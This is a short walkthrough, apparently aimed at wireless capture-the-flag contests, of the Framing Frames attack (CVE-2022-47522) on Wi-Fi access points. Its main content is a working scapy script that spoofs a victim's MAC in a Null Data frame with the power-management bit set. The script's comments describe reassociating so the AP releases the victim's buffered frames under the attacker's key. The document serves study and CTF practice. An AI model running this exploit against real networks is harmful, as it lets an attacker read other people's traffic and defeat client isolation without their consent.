# Framing Frames walkthrough (short)

Public PoC scripts accompany the 2023 paper (CVE-2022-47522). Setup is
fiddly and depends on the target AP firmware; the below is the primitive.

## The payoff step — power-save queue poisoning

The trick that actually unlocks queued frames: send a scapy-crafted
**Null Data frame with the Power Management bit set**, spoofed from the
victim's MAC, to the AP. The AP buffers subsequent frames destined for
the victim in its per-STA power-save queue. Then the attacker
dissociates and reassociates using the victim's MAC, forcing a new
PTKSA. The AP releases the buffered frames encrypted under the
**attacker's** freshly-installed PTK — so the attacker decrypts them.

```python
from scapy.all import RadioTap, Dot11, Dot11QoS, sendp

AP_BSSID   = "aa:bb:cc:dd:ee:ff"
VICTIM_MAC = "11:22:33:44:55:66"

# Null Data frame (type=2, subtype=4) with PwrMgt=1
# FCfield 0x11 = ToDS(0x01) + PwrMgt(0x10)
frame = (
    RadioTap() /
    Dot11(
        type=2, subtype=4,           # Null Data
        FCfield=0x11,                # ToDS + PwrMgt
        addr1=AP_BSSID,              # RA = AP
        addr2=VICTIM_MAC,            # TA = victim (spoofed)
        addr3=AP_BSSID,
    ) /
    Dot11QoS()
)
sendp(frame, iface="wlan1mon", count=5, inter=0.05)

# Now the AP thinks the victim is asleep; frames destined for the
# victim's MAC pile up in the per-STA TX queue.
#
# Next, from the attacker's real radio, associate + complete a fresh
# 4-way handshake under the victim's MAC. The AP releases the buffered
# queue encrypted under the attacker's new PTK — attacker decrypts.
```

See the Vanhoef 2023 GitHub repo (linked from the paper) for the
maintained PoC. In a WCTF, the flag surface is typically a
client-isolation bypass response — you talk to a supposedly-isolated
peer STA, they answer.

## Cite

- Vanhoef 2023 — Framing Frames, §3 "Attack primitives".
- CVE-2022-47522 — Framing Frames power-save queue tap.
- attacks.json: `framing-frames-power-save-poison`.
